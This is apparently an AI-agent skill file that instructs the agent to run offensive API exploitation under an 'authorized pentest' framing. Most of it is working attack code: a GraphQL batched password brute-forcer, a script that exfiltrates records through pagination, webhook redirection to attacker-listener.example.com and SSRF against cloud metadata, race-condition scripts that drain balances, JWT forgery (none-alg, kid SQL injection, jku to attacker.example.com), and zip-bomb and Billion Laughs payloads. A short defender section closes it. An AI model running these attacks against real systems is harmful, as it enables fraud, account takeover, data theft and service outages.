---
name: offensive-api-abuse
description: "Advanced API exploitation methodology focused on business logic abuse and sophisticated attack patterns that bypass traditional security controls. Covers business logic bypass through API call chaining and workflow manipulation. Addresses GraphQL-specific attacks including batching for credential brute-force, query depth exploitation, and introspection abuse. Includes pagination exploitation for data exfiltration, webhook hijacking for SSRF and data interception, and resource exhaustion through algorithmic complexity attacks. Covers race conditions in API transactions using parallel request techniques. Provides comprehensive JWT manipulation including algorithm confusion, kid injection, jku/x5u abuse, and claim tampering. Details API key leakage detection across source repositories, client-side code, and error messages. Covers undocumented endpoint discovery through predictable naming, debug routes, and source map analysis. Tooling includes Arjun, ParamSpider, jwt_tool, and GraphQL Voyager. Designed for authorized penetration testers targeting business logic layers that automated scanners miss."
---

# Offensive API Abuse and Advanced Exploitation

You are conducting authorized security assessments targeting the business logic layer of API-driven applications. Traditional vulnerability scanners miss the attack patterns in this skill because they require understanding of application workflows, state transitions, and trust relationships between API endpoints. Your goal is to identify vulnerabilities that allow financial manipulation, data exfiltration through legitimate channels, privilege escalation via workflow abuse, and service disruption through logic-layer attacks.

## Quick Workflow

1. Map the complete API surface including undocumented endpoints using Arjun, ParamSpider, and manual discovery.
2. Model the business workflows: identify multi-step transactions, state machines, and trust chains between endpoints.
3. Test each workflow for race conditions using parallel request techniques.
4. Extract and analyze JWTs for algorithm confusion, weak signing, and claim injection opportunities.
5. If GraphQL is present, test batching for brute-force amplification, query depth for DoS, and introspection for schema leakage.
6. Probe pagination for data enumeration and exfiltration opportunities.
7. Test webhook configurations for SSRF and callback hijacking.
8. Search for API key leakage in client code, error responses, and public repositories.
9. Verify all discovered endpoints for authorization consistency.
10. Document business impact for each finding with financial or operational consequence estimates.

---

## Business Logic Bypass via API Chaining

Business logic vulnerabilities emerge when individual API endpoints are secure in isolation but the workflow connecting them has exploitable gaps. You identify these by mapping the intended transaction flow and then deviating from it.

```bash
# Example: E-commerce checkout bypass
# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm

# Step 1: Add item to cart
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "PROD-001", "quantity": 1}' \
  "https://target.example.com/api/v1/cart/items" | jq .

# Step 2: Apply coupon
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "SAVE20"}' \
  "https://target.example.com/api/v1/cart/coupon" | jq .

# Step 3: Attempt to skip payment and go directly to confirm
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "CART-12345"}' \
  "https://target.example.com/api/v1/orders/confirm" | jq .
```

```bash
# Price manipulation: modify cart after price calculation
# 1. Add expensive item to trigger free shipping
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "EXPENSIVE-001", "quantity": 1}' \
  "https://target.example.com/api/v1/cart/items"

# 2. Calculate total (should qualify for free shipping)
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/cart/calculate"

# 3. Remove expensive item, keep free shipping benefit
curl -s -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/cart/items/EXPENSIVE-001"

# 4. Proceed to payment with manipulated total
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"payment_method": "card_on_file"}' \
  "https://target.example.com/api/v1/cart/pay"
```

```bash
# State manipulation: exploit state transitions
# Test if you can revert an order to a modifiable state after payment
curl -s -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "pending"}' \
  "https://target.example.com/api/v1/orders/ORD-5001"

# Test negative quantity / negative price injection
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": "PROD-001", "quantity": -1}' \
  "https://target.example.com/api/v1/cart/items"

# Test currency confusion
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 100, "currency": "IDR"}' \
  "https://target.example.com/api/v1/payments"
```

---

## GraphQL Batching and Abuse

GraphQL APIs introduce unique attack surfaces through query batching, introspection, and nested query execution that bypass rate limiting and authorization controls.

Introspection for full schema discovery:

```bash
# Full introspection query
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' \
  "https://target.example.com/graphql" | jq '.data.__schema.types[] | select(.kind == "OBJECT")'
```

```bash
# Extract mutations (write operations)
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}' \
  "https://target.example.com/graphql" | jq '.data.__schema.mutationType.fields[].name'
```

Batching for brute-force amplification -- send multiple authentication attempts in a single HTTP request to bypass per-request rate limiting:

```python
#!/usr/bin/env python3
"""GraphQL batching for authentication brute-force amplification."""
import requests
import json
import sys

TARGET = "https://target.example.com/graphql"
BATCH_SIZE = 50

def build_batch(email, passwords):
    """Build a batched GraphQL query with multiple login attempts."""
    queries = []
    for i, pwd in enumerate(passwords):
        queries.append({
            "query": f"""
                mutation attempt_{i} {{
                    login(email: "{email}", password: "{pwd}") {{
                        token
                        success
                        message
                    }}
                }}
            """
        })
    return queries

def run_batch_brute(email, wordlist_path):
    with open(wordlist_path) as f:
        passwords = [line.strip() for line in f if line.strip()]

    for i in range(0, len(passwords), BATCH_SIZE):
        batch = passwords[i:i + BATCH_SIZE]
        payload = build_batch(email, batch)

        resp = requests.post(
            TARGET,
            json=payload,
            headers={"Content-Type": "application/json"}
        )

        if resp.status_code == 429:
            print(f"[!] Rate limited at batch starting index {i}")
            break

        results = resp.json()
        for j, result in enumerate(results):
            data = result.get("data", {}).get("login", {})
            if data.get("success"):
                print(f"[+] Valid credentials: {email}:{batch[j]}")
                print(f"    Token: {data.get('token', 'N/A')}")
                return
            elif data.get("message"):
                pass  # Silently skip failures

        print(f"  Tested batch {i // BATCH_SIZE + 1} ({len(batch)} attempts in 1 request)")

if __name__ == "__main__":
    run_batch_brute(sys.argv[1], sys.argv[2])
```

Query depth exploitation for denial of service:

```bash
# Deeply nested query to exhaust server resources
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "query": "{ users { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }"
  }' \
  "https://target.example.com/graphql"

# Field duplication for response amplification
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "query": "{ a1: users { name email } a2: users { name email } a3: users { name email } a4: users { name email } a5: users { name email } a6: users { name email } a7: users { name email } a8: users { name email } a9: users { name email } a10: users { name email } }"
  }' \
  "https://target.example.com/graphql"
```

---

## Pagination Exploitation

Pagination mechanisms can leak total record counts, expose data through cursor manipulation, and allow complete database enumeration when not properly constrained.

```bash
# Probe pagination boundaries
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=1" | \
  jq '{total: .total, total_pages: .total_pages, current_page: .page}'

# Request maximum page size
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=999999" | \
  jq 'length'

# Negative page numbers
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=-1&per_page=100" | jq .
```

```bash
# Cursor-based pagination manipulation
# Decode cursor (often base64-encoded identifiers)
echo "eyJpZCI6MTAwMX0=" | base64 -d
# Output: {"id":1001}

# Forge a cursor to access arbitrary records
forged_cursor=$(echo -n '{"id":1}' | base64 -w0)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?cursor=${forged_cursor}&limit=100" | jq .

# Test sort parameter injection for data ordering attacks
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?sort=password&order=asc" | jq .

# Filter parameter injection
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?filter[role]=admin" | jq .
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?role=admin&is_active=true" | jq .
```

```python
#!/usr/bin/env python3
"""Complete pagination-based data exfiltration."""
import requests
import json
import time

TARGET = "https://target.example.com/api/v1/records"
TOKEN = "YOUR_TOKEN"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

def exfiltrate_all():
    page = 1
    all_records = []

    while True:
        resp = requests.get(
            TARGET,
            params={"page": page, "per_page": 100},
            headers=HEADERS
        )

        if resp.status_code != 200:
            print(f"[!] Stopped at page {page}: HTTP {resp.status_code}")
            break

        data = resp.json()
        records = data.get("results", data.get("data", []))

        if not records:
            break

        all_records.extend(records)
        print(f"  Page {page}: {len(records)} records (total: {len(all_records)})")
        page += 1
        time.sleep(0.5)  # Respectful pacing

    print(f"[+] Exfiltrated {len(all_records)} total records")
    with open("exfiltrated_records.json", "w") as f:
        json.dump(all_records, f, indent=2)

exfiltrate_all()
```

---

## Webhook Hijacking and SSRF

Webhook configurations allow you to redirect server-initiated callbacks to attacker-controlled endpoints, enabling data interception and SSRF.

```bash
# Register a webhook pointing to your controlled server
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://attacker-listener.example.com/webhook",
    "events": ["user.created", "order.completed", "payment.received"],
    "secret": "attacker_secret"
  }' \
  "https://target.example.com/api/v1/webhooks" | jq .

# List existing webhooks to discover internal URLs
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/webhooks" | jq '.[] | {id, url, events}'
```

```bash
# Webhook SSRF: point webhook URL to internal services
internal_targets=(
  "http://127.0.0.1:8080/admin"
  "http://169.254.169.254/latest/meta-data/"
  "http://internal-api.local:3000/health"
  "http://redis.internal:6379/"
  "http://elasticsearch.internal:9200/_cat/indices"
)

for target_url in "${internal_targets[@]}"; do
  resp=$(curl -s -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"${target_url}\", \"events\": [\"test.ping\"]}" \
    "https://target.example.com/api/v1/webhooks")
  echo "Target: ${target_url}"
  echo "Response: ${resp}" | head -c 200
  echo -e "\n---"
done

# Trigger a webhook delivery and inspect what the server sends
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/webhooks/WH-001/test" | jq .
```

```bash
# Modify existing webhook to redirect callbacks
# First, find webhook IDs
webhook_id=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/webhooks" | jq -r '.[0].id')

# Update to attacker URL
curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker-listener.example.com/capture"}' \
  "https://target.example.com/api/v1/webhooks/${webhook_id}" | jq .
```

---

## Race Conditions in API Transactions

Race conditions occur when APIs fail to properly serialize concurrent requests against shared state. You exploit these to duplicate transactions, bypass limits, or corrupt state.

```python
#!/usr/bin/env python3
"""Race condition testing for API transaction abuse."""
import asyncio
import aiohttp
import time

TARGET = "https://target.example.com/api/v1"
TOKEN = "YOUR_TOKEN"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

async def send_request(session, url, method="POST", data=None):
    """Send a single request and return status + body."""
    async with session.request(method, url, json=data, headers=HEADERS) as resp:
        body = await resp.json()
        return {"status": resp.status, "body": body}

async def race_coupon_redeem(coupon_code, num_requests=20):
    """Race condition: redeem a single-use coupon multiple times."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(
                session,
                f"{TARGET}/cart/coupon",
                data={"coupon_code": coupon_code}
            )
            for _ in range(num_requests)
        ]
        results = await asyncio.gather(*tasks)

        successes = [r for r in results if r["status"] == 200]
        print(f"[+] Coupon '{coupon_code}' redeemed {len(successes)}/{num_requests} times")
        for r in successes:
            print(f"    Discount applied: {r['body'].get('discount', 'N/A')}")

async def race_balance_transfer(num_requests=20):
    """Race condition: drain account by sending parallel transfers."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(
                session,
                f"{TARGET}/transfers",
                data={
                    "to_account": "ATTACKER-ACCT",
                    "amount": 100,
                    "currency": "USD"
                }
            )
            for _ in range(num_requests)
        ]
        results = await asyncio.gather(*tasks)

        successes = [r for r in results if r["status"] in (200, 201)]
        print(f"[+] Transfers succeeded: {len(successes)}/{num_requests}")
        total = sum(r["body"].get("amount", 0) for r in successes)
        print(f"    Total transferred: {total}")

async def race_vote_manipulation(item_id, num_requests=50):
    """Race condition: bypass one-vote-per-user restriction."""
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(
                session,
                f"{TARGET}/items/{item_id}/vote",
                data={"vote": "up"}
            )
            for _ in range(num_requests)
        ]
        results = await asyncio.gather(*tasks)

        successes = [r for r in results if r["status"] in (200, 201)]
        print(f"[+] Votes registered: {len(successes)}/{num_requests}")

if __name__ == "__main__":
    asyncio.run(race_coupon_redeem("SINGLE-USE-COUPON"))
    asyncio.run(race_balance_transfer())
```

```bash
# Race condition using GNU parallel with curl
# Test parallel coupon redemption
seq 1 20 | parallel -j 20 'curl -s -o /dev/null -w "Request {}: %{http_code}\n" \
  -X POST \
  -H "Authorization: Bearer '"$TOKEN"'" \
  -H "Content-Type: application/json" \
  -d '\''{"coupon_code": "SINGLE-USE"}'\'' \
  "https://target.example.com/api/v1/cart/coupon"'
```

---

## JWT Manipulation

JSON Web Tokens often carry authorization decisions client-side. You exploit weaknesses in token generation, validation, and cryptographic implementation.

```bash
# Decode JWT without verification
jwt_tool "$JWT_TOKEN"

# Algorithm confusion: change RS256 to HS256
# The server's RSA public key becomes the HMAC secret
jwt_tool "$JWT_TOKEN" -X a

# None algorithm attack
jwt_tool "$JWT_TOKEN" -X n

# Test with algorithm set to none, None, NONE, nOnE
for alg in "none" "None" "NONE" "nOnE"; do
  header=$(echo -n "{\"alg\":\"${alg}\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  payload=$(echo "$JWT_TOKEN" | cut -d. -f2)
  forged="${header}.${payload}."
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer ${forged}" \
    "https://target.example.com/api/v1/users/me")
  echo "Algorithm '${alg}' -> HTTP ${code}"
done
```

```bash
# kid (Key ID) injection for path traversal or SQL injection
# Craft token with kid pointing to a known file
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "../../dev/null" -S hs256 -p ""
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "/proc/sys/kernel/hostname" -S hs256 -p ""

# kid SQL injection
jwt_tool "$JWT_TOKEN" -I -hc kid -hv "' UNION SELECT 'attacker_secret' -- " -S hs256 -p "attacker_secret"
```

```bash
# jku (JWK Set URL) abuse: point to attacker-controlled JWKS
# 1. Generate an RSA keypair
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout -out attacker_pub.pem

# 2. Create JWKS file and host it
python3 -c "
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64

with open('attacker_pub.pem', 'rb') as f:
    pub_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

numbers = pub_key.public_numbers()
n = base64.urlsafe_b64encode(numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode()

jwks = {
    'keys': [{
        'kty': 'RSA',
        'kid': 'attacker-key-1',
        'use': 'sig',
        'n': n,
        'e': e
    }]
}
print(json.dumps(jwks, indent=2))
" > jwks.json

# 3. Forge token with jku pointing to attacker JWKS
jwt_tool "$JWT_TOKEN" -I \
  -hc jku -hv "https://attacker.example.com/.well-known/jwks.json" \
  -hc kid -hv "attacker-key-1" \
  -S rs256 \
  -pr attacker_key.pem
```

```bash
# Claim tampering: modify payload claims
# Escalate role
jwt_tool "$JWT_TOKEN" -I -pc role -pv admin -S hs256 -p "$KNOWN_SECRET"

# Change user identity
jwt_tool "$JWT_TOKEN" -I -pc sub -pv "admin@target.com" -S hs256 -p "$KNOWN_SECRET"

# Extend token lifetime
jwt_tool "$JWT_TOKEN" -I -pc exp -pv 9999999999 -S hs256 -p "$KNOWN_SECRET"

# Add claims that may grant access
jwt_tool "$JWT_TOKEN" -I \
  -pc is_admin -pv true \
  -pc permissions -pv '["admin","superuser"]' \
  -S hs256 -p "$KNOWN_SECRET"
```

---

## API Key Leakage Patterns

API keys leak through predictable channels. You systematically search for them across all exposure surfaces.

```bash
# Search public repositories for leaked keys
# Use GitHub code search (requires auth)
gh api search/code -q '.items[] | {repo: .repository.full_name, path: .path}' \
  --method GET \
  -f "q=org:target-org api_key OR apikey OR api-key OR secret_key"

# Search for specific key patterns
gh api search/code -q '.items[] | {repo: .repository.full_name, path: .path, url: .html_url}' \
  --method GET \
  -f "q=org:target-org AKIA OR sk_live OR rk_live"
```

```bash
# Client-side key extraction from web applications
# Download and search JavaScript bundles
curl -s "https://target.example.com/" | \
  grep -oE 'src="[^"]*\.js[^"]*"' | \
  sed 's/src="//;s/"//' | while read -r js_url; do
    full_url="https://target.example.com${js_url}"
    echo "=== Scanning: ${full_url} ==="
    curl -s "$full_url" | grep -oiE \
      '(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|secret[_-]?key)["\x27]?\s*[:=]\s*["\x27][A-Za-z0-9+/=_-]{16,}["\x27]'
done
```

```bash
# Extract keys from mobile app bundles (APK)
# After decompiling with apktool or jadx
grep -rE '(api_key|apiKey|API_KEY|secret|token)\s*=\s*"[A-Za-z0-9+/=_-]{16,}"' \
  ./decompiled_app/

# Search source maps if exposed
curl -s "https://target.example.com/static/js/main.chunk.js.map" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for source in data.get('sources', []):
    print(source)
" 2>/dev/null
```

```bash
# Error message key leakage
# Trigger verbose errors that may expose keys
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"invalid": true}' \
  "https://target.example.com/api/v1/connect" | \
  grep -iE '(key|token|secret|password|credential)'

# Stack trace extraction
curl -s -H "Accept: application/json" \
  "https://target.example.com/api/v1/debug/error" | \
  python3 -c "
import sys, json, re
data = sys.stdin.read()
secrets = re.findall(r'(?:key|token|secret|password|api)[_-]?\w*[\"'\'':\s=]+([A-Za-z0-9+/=_-]{20,})', data, re.I)
for s in secrets:
    print(f'Potential secret: {s}')
"
```

---

## Undocumented Endpoint Discovery

Production APIs frequently expose endpoints not listed in public documentation. You discover them through predictable naming patterns, debug routes, and application source analysis.

```bash
# Parameter discovery with Arjun
arjun -u "https://target.example.com/api/v1/users" \
  -m GET \
  --headers "Authorization: Bearer $TOKEN" \
  -t 10

# Discover hidden parameters on POST endpoints
arjun -u "https://target.example.com/api/v1/users" \
  -m POST \
  --headers "Authorization: Bearer $TOKEN" \
  -t 10
```

```bash
# ParamSpider for URL parameter mining from web archives
paramspider -d target.example.com --exclude woff,css,js,png,svg,jpg,gif

# Combine with manual endpoint brute-forcing
wordlist=(
  "internal" "debug" "test" "dev" "staging" "beta"
  "admin" "manage" "console" "dashboard" "config"
  "health" "status" "metrics" "info" "version"
  "graphql" "playground" "explorer" "swagger" "docs"
  "backup" "export" "import" "migrate" "sync"
  "batch" "bulk" "queue" "worker" "cron"
  "webhook" "callback" "notify" "event" "hook"
  "upload" "download" "file" "attachment" "media"
  "search" "filter" "query" "lookup" "suggest"
  "reset" "verify" "confirm" "activate" "deactivate"
)

for word in "${wordlist[@]}"; do
  for prefix in "/api/v1" "/api/v2" "/api/internal" "/api" "/_"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer $TOKEN" \
      "${TARGET}${prefix}/${word}")
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
      echo "[${code}] ${prefix}/${word}"
    fi
  done
done
```

```bash
# Source map analysis for route discovery
# Check if source maps are publicly accessible
for ext in ".js.map" ".chunk.js.map" ".bundle.js.map"; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "https://target.example.com/static/js/main${ext}"
done

# Extract API routes from downloaded JavaScript
curl -s "https://target.example.com/static/js/main.js" | \
  grep -oE '["'\'']/api/[a-zA-Z0-9/_-]+["'\'']' | sort -u

# Search for route definitions in React/Angular/Vue bundles
curl -s "https://target.example.com/static/js/main.js" | \
  grep -oE '(path|route|endpoint|url)\s*:\s*["\x27]/[^"\x27]+["\x27]' | sort -u
```

---

## Resource Exhaustion and Algorithmic Complexity

Target API operations that have disproportionate server-side cost relative to request complexity. These attacks cause denial of service through legitimate-looking requests.

```bash
# Regex denial of service via search parameters
# Craft input that triggers catastrophic backtracking
curl -s -o /dev/null -w "Time: %{time_total}s, Status: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/search?q=$(python3 -c "print('a' * 50 + '!')")"

# Compare response times for varying input lengths
for len in 10 20 30 40 50; do
  payload=$(python3 -c "print('a' * ${len} + '!')")
  curl -s -o /dev/null -w "Length ${len}: %{time_total}s\n" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/v1/search?q=${payload}"
done
```

```bash
# File processing abuse
# Upload a decompression bomb (zip bomb)
python3 -c "
import zipfile, io, os
# Create a small zip containing highly compressible data
with zipfile.ZipFile('bomb.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('payload.txt', '0' * (10 * 1024 * 1024))
print('Created bomb.zip')
"

curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@bomb.zip" \
  "https://target.example.com/api/v1/upload"

# XML entity expansion (Billion Laughs) if XML input accepted
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>' \
  "https://target.example.com/api/v1/import"
```

---

## Detection / Defender View

When you execute these techniques, you generate specific artifacts that defenders monitor for:

- **Business logic abuse** does not trigger signature-based detection because each individual request is valid. Behavioral analytics that model expected user workflows detect deviations such as checkout steps executed out of order, coupon codes applied in parallel, or state transitions that violate the application state machine. Transaction monitoring systems flag anomalous patterns like duplicate rewards, negative-amount transfers, or currency mismatches.

- **GraphQL batching** produces abnormally large request payloads with multiple operations. API gateways that enforce query complexity limits, depth limits, or operation count limits block these. Slow-query logs capture expensive nested queries. Introspection queries from non-development sources trigger alerts in monitored environments.

- **Pagination abuse** manifests as requests with abnormal page sizes or sequential page fetches at high volume. Data loss prevention systems may alert on bulk data access patterns. API analytics platforms flag accounts that retrieve disproportionately more data than typical users.

- **Webhook manipulation** is detected by webhook registration audit logs. Outbound connection monitoring flags callbacks to unexpected external or internal destinations. SSRF defenses that validate callback URLs against allowlists block internal network targets.

- **Race conditions** produce bursts of identical requests within millisecond windows. Distributed tracing systems capture concurrent state modifications. Database transaction logs show serialization failures or deadlocks triggered by the attack.

- **JWT attacks** involving algorithm confusion or none-algorithm produce tokens with unexpected header values logged by authentication middleware. Failed signature validation attempts generate auth-layer errors. Tokens with jku or x5u headers pointing to external URLs trigger URL validation alerts.

- **API key scanning** in source repositories is detected by GitHub Secret Scanning and similar tools. Client-side key usage generates API calls from unexpected IP ranges or user agents.

- **Endpoint enumeration** produces 404 bursts and unusual URL path patterns in access logs. Web application firewalls flag path traversal patterns in endpoint discovery attempts.

---

## Engagement Cheatsheet

| Phase | Action | Tool |
|-------|--------|------|
| Discovery | Hidden parameter enumeration | Arjun |
| Discovery | URL parameter mining from archives | ParamSpider |
| Discovery | GraphQL schema introspection | curl, GraphQL Voyager |
| Discovery | Undocumented endpoint brute-force | Custom wordlist scripts |
| Discovery | Source map analysis | curl, browser DevTools |
| Logic | Workflow bypass via API chaining | curl, Burp Repeater |
| Logic | Price/state manipulation | curl sequences |
| Logic | Race condition exploitation | Python asyncio/aiohttp, GNU parallel |
| Auth | JWT algorithm confusion | jwt_tool |
| Auth | JWT kid injection | jwt_tool |
| Auth | JWT jku/x5u abuse | jwt_tool, openssl |
| Auth | JWT claim tampering | jwt_tool |
| Data | Pagination-based exfiltration | Python scripts |
| Data | GraphQL batched brute-force | Python scripts |
| Data | API key leakage search | gh, grep, curl |
| Infrastructure | Webhook hijacking | curl |
| Infrastructure | Webhook SSRF | curl |
| Infrastructure | Resource exhaustion | curl, Python |
| Infrastructure | XML entity expansion | curl |
| Reporting | Consolidate business impact | Manual documentation |

---

## Key References

- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Testing Guide -- Business Logic Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
- GraphQL Security Best Practices: https://graphql.org/learn/security/
- PortSwigger -- Race Conditions: https://portswigger.net/web-security/race-conditions
- jwt_tool Repository: https://github.com/ticarpi/jwt_tool
- Arjun Repository: https://github.com/s0md3v/Arjun
- ParamSpider Repository: https://github.com/devanshbatham/ParamSpider
- GraphQL Voyager: https://github.com/graphql-kit/graphql-voyager
- "Black Hat GraphQL" by Nick Aleks and Dolev Farhi (No Starch Press)
- RFC 7519 -- JSON Web Token: https://datatracker.ietf.org/doc/html/rfc7519
- CWE-362 -- Concurrent Execution Using Shared Resource: https://cwe.mitre.org/data/definitions/362.html
